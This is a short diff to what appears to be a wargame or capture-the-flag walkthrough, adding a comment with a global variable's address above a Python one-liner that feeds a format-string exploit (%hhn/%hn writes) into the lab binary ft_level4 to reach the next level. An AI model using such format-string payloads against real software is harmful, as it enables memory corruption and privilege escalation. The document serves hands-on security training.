@@ -48,6 +48,8 @@ su level5
 
 # As user level4:
 
+    # g_var is at address 0x0804a028
+
     # Run the program
     python -c "print('\x08\x04\xa0\x28'[::-1] + '\x08\x04\xa0\x29'[::-1] + '\x08\x04\xa0\x2a'[::-1] + 'A' * 56 + '%12\$hhn' + 'A' * 17 + '%13\$hhn' + 'A' * 173 + '%14\$hn')" | /home/user/level5/ft_level4
 
